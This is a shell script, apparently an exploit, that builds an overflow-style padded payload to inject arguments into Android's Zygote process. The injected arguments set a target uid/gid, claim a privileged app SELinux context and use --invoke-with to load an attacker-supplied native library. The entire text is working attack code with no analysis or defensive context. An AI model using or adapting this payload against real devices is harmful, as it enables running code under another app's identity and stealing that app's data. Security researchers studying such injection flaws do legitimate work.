buffer_size=8192
newline_num=5000

# prefix add newline_num + 1 at beginning
prefix="$(($newline_num + 1))\n--set-api-denylist-exemptions\n"
prefix_len=$(echo -n "$prefix" | wc -c)

add_chars=$(($buffer_size - $prefix_len - $newline_num + 1))

# new 5000 \n
for i in $(seq 1 $newline_num); do
    echo -n '\n'
done

# padding to 8192
payload=$(printf "%${add_chars}s" 8 | tr ' ' A)
payload=$payload

# inject cmd
inject='\n--setuid=10090\n--setgid=1000\n--runtime-args\n--seinfo=platform:privapp:targetSdkVersion=29:complete\n--runtime-flags=1\n--nice-name=zYg0te\n--invoke-with\n/system/bin/logwrapper echo zYg0te $(LD_LIBRARY_PATH=[path to your native lib] [path to your native lib]) #'
payload=$payload$inject
echo $payload

# 4999 commas (after the payload)
for i in $(seq 1 $(($newline_num - 1))); do
    echo -n ","
done
echo "X"
